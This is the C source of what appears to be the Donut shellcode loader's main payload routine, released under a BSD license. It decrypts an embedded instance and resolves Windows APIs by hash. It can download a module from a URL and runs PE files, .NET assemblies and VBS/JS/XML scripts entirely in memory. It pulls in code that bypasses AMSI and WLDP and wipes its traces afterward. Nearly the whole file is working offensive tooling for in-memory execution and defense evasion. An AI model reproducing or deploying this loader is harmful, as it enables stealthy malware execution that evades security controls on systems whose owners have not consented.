/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "payload.h"

DWORD ThreadProc(LPVOID lpParameter) {
    ULONG           i, ofs;
    ULONG64         sig;
    PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
    DONUT_ASSEMBLY  assembly;
    PDONUT_MODULE   mod;
    VirtualAlloc_t  _VirtualAlloc;
    VirtualFree_t   _VirtualFree;
    LPVOID          pv;
    
    DPRINT("Resolving address for VirtualAlloc() : %p and VirtualFree() : %p", 
     (LPVOID)inst->api.VirtualAlloc, (LPVOID)inst->api.VirtualFree);
     
    _VirtualAlloc = (VirtualAlloc_t)xGetProcAddress(inst, (ULONG64)inst->api.VirtualAlloc, inst->iv);
    _VirtualFree  = (VirtualFree_t) xGetProcAddress(inst, (ULONG64)inst->api.VirtualFree,  inst->iv);
    
    DPRINT("VirtualAlloc : %p VirtualFree : %p", 
      (LPVOID)_VirtualAlloc, (LPVOID)_VirtualFree);
    
    DPRINT("Allocating %i bytes of RW memory", inst->len);
    pv = _VirtualAlloc(NULL, inst->len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if(pv == NULL) {
      DPRINT("Memory allocation failed...");
      return -1;
    }
    DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
    Memcpy(pv, lpParameter, inst->len);
    inst = (PDONUT_INSTANCE)pv;
    
    DPRINT("Zero initializing PDONUT_ASSEMBLY");
    Memset(&assembly, 0, sizeof(assembly));
    
#if !defined(NOCRYPTO)
    PBYTE           inst_data;
    // load pointer to data just past len + key
    inst_data = (PBYTE)inst + offsetof(DONUT_INSTANCE, api_cnt);
    
    DPRINT("Decrypting %li bytes of instance", inst->len);
    
    donut_decrypt(inst->key.mk, 
            inst->key.ctr, 
            inst_data, 
            inst->len - offsetof(DONUT_INSTANCE, api_cnt));
    
    DPRINT("Generating hash to verify decryption");
    ULONG64 mac = maru(inst->sig, inst->iv);
    DPRINT("Instance : %016llx | Result : %016llx", inst->mac, mac);
    
    if(mac != inst->mac) {
      DPRINT("Decryption of instance failed");
      return -1;
    }
#endif
    DPRINT("Resolving LoadLibraryA");
    
    inst->api.addr[0] = xGetProcAddress(inst, inst->api.hash[0], inst->iv);
    if(inst->api.addr[0] == NULL) return -1;
    
    for(i=0; i<inst->dll_cnt; i++) {
      DPRINT("Loading %s ...", inst->dll_name[i]);
      inst->api.LoadLibraryA(inst->dll_name[i]);
    }
    
    DPRINT("Resolving %i API", inst->api_cnt);
    
    for(i=1; i<inst->api_cnt; i++) {
      DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
        
      inst->api.addr[i] = xGetProcAddress(inst, inst->api.hash[i], inst->iv);
      
      if(inst->api.addr[i] == NULL) {
        DPRINT("Failed to resolve API");
        return -1;
      }
    }
    
    if(inst->type == DONUT_INSTANCE_URL) {
      DPRINT("Instance is URL");
      if(!DownloadModule(inst)) return -1;
    }
    
    if(inst->type == DONUT_INSTANCE_PIC) {
      DPRINT("Using module embedded in instance");
      mod = (PDONUT_MODULE)&inst->module.x;
    } else {
      DPRINT("Loading module from allocated memory");
      mod = inst->module.p;
    }
    
    // unmanaged EXE/DLL?
    if(mod->type == DONUT_MODULE_DLL ||
       mod->type == DONUT_MODULE_EXE) {
      RunPE(inst);
    } else
    // .NET EXE/DLL?
    if(mod->type == DONUT_MODULE_NET_DLL || 
       mod->type == DONUT_MODULE_NET_EXE)
    {
      if(LoadAssembly(inst, &assembly)) {
        RunAssembly(inst, &assembly);
      }
      FreeAssembly(inst, &assembly);
    } else 
    // vbs or js?
    if(mod->type == DONUT_MODULE_VBS ||
       mod->type == DONUT_MODULE_JS)
    {
      RunScript(inst);
    } else
    // xml?
    if(mod->type == DONUT_MODULE_XML) {
      RunXML(inst);
    }
    
    // if module was downloaded
    if(inst->type == DONUT_INSTANCE_URL) {
      if(inst->module.p != NULL) {
        // overwrite memory with zeros
        Memset(inst->module.p, 0, (DWORD)inst->mod_len);
        
        // free memory
        inst->api.VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
        inst->module.p = NULL;
      }
    }
    
    DPRINT("Erasing RW memory for instance");
    Memset(inst, 0, inst->len);
    
    DPRINT("Releasing RW memory for instance");
    _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
    
    return 0;
}

#include "http_client.c"     // For downloading module

#include "inmem_dotnet.c"    // .NET assemblies
#include "inmem_pe.c"        // Unmanaged PE/DLL files
#include "inmem_xml.c"       // XML files
#include "inmem_script.c"    // VBS/JS files

#include "bypass.c"          // Bypass AMSI and WLDP
#include "peb.c"             // resolve functions in export table
#include "getpc.c"           // code stub to return program counter (always at the end!)

// the following code is *only* for development purposes
// given an instance file, it will run as if running on a target system
// attach a debugger to host process
#ifdef DEBUG

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    FILE           *fd;
    struct stat     fs;
    PDONUT_INSTANCE inst;
    
    if(argc != 2) {
      printf("  [ usage: payload <instance>\n");
      return 0;
    }
    // get size of instance
    if(stat(argv[1], &fs) != 0) {
      printf("  [ unable to obtain size of instance.\n");
      return 0;
    }
    
    // zero size?
    if(fs.st_size == 0) {
      printf("  [ invalid instance.\n");
      return 0;
    }
    
    // try open for reading
    fd = fopen(argv[1], "rb");
    if(fd == NULL) {
      printf("  [ unable to open %s.\n", argv[1]);
      return 0;
    }

    // allocate memory
    inst = (PDONUT_INSTANCE)malloc(fs.st_size);
    
    if(inst != NULL) {
      fread(inst, 1, fs.st_size, fd);
      printf("Running...");
      // run payload with instance
      ThreadProc(inst);
      free(inst);
    }
    fclose(fd);
    return 0;
}
#endif
